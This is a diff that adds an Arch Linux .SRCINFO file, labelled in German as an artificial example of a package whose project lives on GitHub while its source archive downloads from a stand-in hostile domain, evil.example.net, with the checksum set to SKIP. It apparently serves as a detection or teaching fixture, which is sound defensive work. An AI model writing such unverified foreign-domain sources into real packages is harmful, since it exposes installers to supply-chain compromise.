@@ -1,0 +1,10 @@
+pkgbase = app-bin
+	pkgdesc = Künstliches Beispiel: Projekt auf GitHub, Download von einer fremden Domain
+	pkgver = 1.0
+	pkgrel = 1
+	url = https://github.com/foo/app
+	arch = x86_64
+	source_x86_64 = app-1.0.tar.gz::https://evil.example.net/app.tar.gz
+	sha256sums_x86_64 = SKIP
+
+pkgname = app-bin
